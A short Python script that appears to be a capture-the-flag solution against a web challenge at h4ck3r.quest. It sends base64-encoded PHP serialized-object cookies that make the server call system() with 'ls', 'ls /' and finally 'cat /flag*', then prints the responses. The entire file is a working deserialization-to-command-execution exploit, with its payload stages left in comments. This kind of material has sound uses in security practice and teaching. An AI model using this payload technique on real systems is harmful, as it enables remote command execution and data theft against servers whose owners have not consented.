import requests


# $(ls)
#cookies={"cat": "TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjI6ImxzIjt9"}
# $(ls /)
#cookies={"cat": "TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjQ6ImxzIC8iO30="}
# $(cat /flag_5fb2acebf1d0c558)
cookies={"cat": "TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjEwOiJjYXQgL2ZsYWcqIjt9"}

r = requests.get("http://h4ck3r.quest:8602", cookies=cookies)
#print(r.content)
string = r.content.split(b'\n')
[print(string[i]) for i in range(len(string))]